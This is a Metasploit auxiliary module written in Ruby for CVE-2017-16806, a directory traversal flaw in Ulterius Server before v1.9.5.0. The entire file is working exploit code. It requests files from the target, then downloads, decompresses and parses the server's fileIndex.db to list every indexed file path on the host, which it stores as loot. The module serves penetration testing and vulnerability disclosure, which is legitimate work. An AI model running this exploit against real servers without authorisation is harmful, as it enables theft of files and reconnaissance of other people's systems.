require 'zlib'
require 'stringio'

class MetasploitModule < Msf::Auxiliary
  #Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ulterius Server File Download Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in Ulterius Server < v1.9.5.0
        to download files from the affected host. A valid file path is needed to download a file.
        Fortunately, Ulterius indexes every file on the system, which can be stored in the
        following location:

          http://ulteriusURL:port/.../fileIndex.db.

        This module can download and parse the fileIndex.db file. There is also an option to
        download a file using a provided path.
      },
      'Author'         =>
        [
          'Rick Osgood',   # Vulnerability discovery and PoC
          'Jacob Robles'   # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB', '43141' ],
          [ 'CVE', '2017-16806' ]
        ]))

      register_options(
        [
          Opt::RPORT(22006),
          OptString.new('TARGETURI', [true, 'The path of the web application', '/']),
          OptBool.new('INDEX', [false, 'Attempt to retrieve and parse fileIndex.db', false])
        ])
  end

  def process_data(index, parse_data)
    length = parse_data[index].unpack('C')[0]
    length += parse_data[index+1].unpack('C')[0]
    length += parse_data[index+2].unpack('C')[0]
    length += parse_data[index+3].unpack('C')[0]

    index += 4
    filename = parse_data[index...index+length]
    index += length
    return index, filename
  end

  def inflate_parse(data)
    zi = Zlib::Inflate.new(window_bits =-15)
    data_inflated = zi.inflate(data)

    parse_data = data_inflated[8...-1]
    remote_files = ""

    index = 0
    print_status("Starting to parse fileIndex.db...")
    while index < parse_data.length
      index, filename = process_data(index, parse_data)
      index, directory = process_data(index, parse_data)
      remote_files += directory + '\\' + filename + "\n"

      #skip FFFFFFFFFFFFFFFF
      index += 8
    end
    myloot = store_loot("ulterius.fileIndex.db", "text/plain", datastore['RHOST'], remote_files, "fileIndex.db", "Remote file system")
    print_status("Remote file paths saved in: #{myloot.to_s}")
  end

  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    })
    if res && res.code == 200
      if datastore['INDEX']
        inflate_parse(res.body)
      else
        print_status(res.body)
      end
    end
  end
end
